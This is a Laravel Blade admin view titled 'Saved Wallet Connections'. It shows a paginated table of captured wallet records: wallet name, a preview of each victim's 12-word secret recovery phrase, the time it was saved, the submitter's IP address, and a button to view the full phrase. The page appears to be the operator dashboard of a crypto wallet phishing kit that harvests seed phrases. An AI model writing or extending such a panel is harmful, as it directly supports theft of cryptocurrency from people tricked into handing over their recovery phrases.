@extends('layouts.app')

@section('content')
<div class="container mt-5">
    <div class="row mb-4">
        <div class="col-12">
            <h1 class="mb-1">Saved Wallet Connections</h1>
            <p class="text-muted">All wallet phrases and connection details</p>
            <hr>
        </div>
    </div>

    <div class="row">
        <div class="col-12">
            @if($connections->count())
                <div class="table-responsive">
                    <table class="table table-striped table-hover">
                        <thead style="background-color: #f8f9fa; border-bottom: 2px solid #dee2e6;">
                            <tr>
                                <th>Wallet Name</th>
                                <th>12-Word Phrase Preview</th>
                                <th>Saved At</th>
                                <th>IP Address</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            @foreach($connections as $connection)
                                <tr>
                                    <td>
                                        <span class="badge" style="background-color: #667eea; font-size: 12px;">
                                            {{ $connection->wallet_name ?? 'Unknown' }}
                                        </span>
                                    </td>
                                    <td>
                                        <small style="color: #666;">{{ substr($connection->secret_phrase, 0, 50) }}{{ strlen($connection->secret_phrase) > 50 ? '...' : '' }}</small>
                                    </td>
                                    <td>
                                        <small>{{ $connection->created_at->format('M d, Y H:i') }}</small>
                                    </td>
                                    <td>
                                        <code>{{ $connection->ip_address ?? 'N/A' }}</code>
                                    </td>
                                    <td>
                                        <a href="{{ route('admin.wallet-connections.show', $connection->id) }}" 
                                           class="btn btn-sm btn-info text-white">
                                            <i class="fa fa-eye"></i> View Full Phrase
                                        </a>
                                    </td>
                                </tr>
                            @endforeach
                        </tbody>
                    </table>
                </div>

                <div class="d-flex justify-content-center mt-4">
                    {{ $connections->links() }}
                </div>
            @else
                <div class="alert alert-info text-center py-5">
                    <i class="fa fa-info-circle fa-2x mb-3"></i>
                    <h5>No Wallets Saved Yet</h5>
                    <p class="text-muted">No wallet phrases have been saved</p>
                </div>
            @endif
        </div>
    </div>
</div>

<style>
    .container {
        max-width: 1200px;
    }

    h1 {
        color: #333;
        font-weight: 600;
    }

    .badge {
        padding: 6px 10px;
        font-weight: 500;
    }

    .table {
        margin-bottom: 0;
    }

    .btn-info {
        background-color: #667eea;
        border: none;
    }

    .btn-info:hover {
        background-color: #5568d3;
    }

    code {
        background-color: #f1f3f5;
        padding: 4px 8px;
        border-radius: 4px;
        color: #495057;
        font-size: 12px;
    }
</style>
@endsection
